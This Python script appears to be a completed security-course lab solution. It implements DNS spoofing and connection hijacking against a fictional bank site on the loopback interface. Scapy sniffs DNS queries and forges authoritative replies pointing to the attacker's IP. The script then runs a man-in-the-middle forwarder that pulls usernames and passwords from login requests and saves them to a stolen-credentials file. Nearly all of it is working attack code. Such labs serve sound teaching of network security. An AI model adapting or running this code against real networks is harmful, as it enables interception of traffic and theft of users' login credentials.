import os
import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "LetumiBank.com"


def resolve_hostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection.
	# Normally obtained via DNS lookup.
	return "127.1.1.1"


def log_credentials(username, password):
	# Write stolen credentials out to file.
	# Do not change this.
	with open("lib/StolenCreds.txt", "wb") as fd:
		fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
	# TODO: Take a block of client data and search for username/password credentials.
	# If found, log the credentials to the system by calling log_credentials().
	username_start_idx = client_data.find("username=") + len("username=")
	username_end_idx = client_data.find("&", username_start_idx)
	username = client_data[username_start_idx:username_end_idx]

	password_start_idx = client_data.find("password=") + len("password=")
	password_end_idx = client_data.find("\r", password_start_idx)
	password = client_data[password_start_idx:password_end_idx]

	log_credentials(username, password)


def handle_tcp_forwarding(client_socket, client_ip, hostname):
	# Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data
	while True:
		# TODO: accept a new connection from the client on client_socket and
		# create a new socket to connect to the actual host associated with hostname.
		client_connection, client_addr = client_socket.accept()
		# check if client is the prior DNS spoof victim
		if client_addr[0] != client_ip:
			client_connection.close()
			continue
		# connect to the real hostname
		host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host_socket.connect((resolve_hostname(hostname),WEB_PORT))
		
		# TODO: read data from client socket, check for credentials, and forward along to host socket.
		# Check for POST to '/post_logout' and exit after that request has completed.
		client_data = client_connection.recv(4000)
		str_client_data = client_data.decode()
		if "/post_login" in str_client_data:
			check_credentials(str_client_data)

		host_socket.sendall(client_data)
		host_resp = host_socket.recv(50000)
		client_connection.sendall(host_resp)

		client_connection.close()
		host_socket.close()
		if "/post_logout" in str_client_data:
			client_socket.close()
			exit()


def dns_callback(packet, extra_args):
	# TODO: Write callback function for handling DNS packets.
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
	fake_server, source_ip = extra_args
	# check if the captured packet is a DNS request asking for HOSTNAME's ip address
	if packet.haslayer(DNSQR) and HOSTNAME in packet[DNSQR].qname.decode():
		# craft the spoofed DNS response using the fields of the request
		# dst ip is the victim ip who sent the request
		# src ip is the real DNS server ip
		IP_layer = IP(dst=packet[IP].src,
					  src=packet[IP].dst)
		# dst port is the victim's src port from the request
		# src port is the DNS server port
		UPD_layer = UDP(dport=packet[UDP].sport,
						sport=packet[UDP].dport)
		# DNS query id should be the same as in the request
		# the DNS response info should be HOSTNAME for the domain name and the attackers ip for the resolved ip
		DNS_layer = DNS(id=packet[DNS].id,
						qd=packet[DNS].qd,
						aa=1,
						qr=1,
						ancount=1,
						an=DNSRR(rrname=packet[DNSQR].qname,
								 rdata=source_ip)
						)
		# assemble the layers to create the whole DNS response
		spoofed_resp = IP_layer/UPD_layer/DNS_layer
		# send spoofed DNS response to the victim
		send(spoofed_resp, verbose=False, iface='lo')

		# wait for the victim to initiate TCP connection
		handle_tcp_forwarding(fake_server, packet[IP].src, HOSTNAME)


def sniff_and_spoof(source_ip):
	# note: implementation is based on an example from a scapy DNS spoof 
	# tutorial from:
	# https://www.thepythoncode.com/article/make-dns-spoof-python

	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
	# This socket will be used to accept connections from victimized clients.
	fake_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	fake_server.bind((source_ip,WEB_PORT))
	fake_server.listen(1)

	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
	# and the socket you created as extra callback arguments. 
	sniff(iface="lo",
		  filter="udp dst port 53",
		  prn=lambda packet: dns_callback(packet, (fake_server, source_ip)),
		  store = 0
		 )

def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
	args = parser.parse_args()

	sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
	# Change working directory to script's dir.
	# Do not change this.
	abspath = os.path.abspath(__file__)
	dirname = os.path.dirname(abspath)
	os.chdir(dirname)
	main()
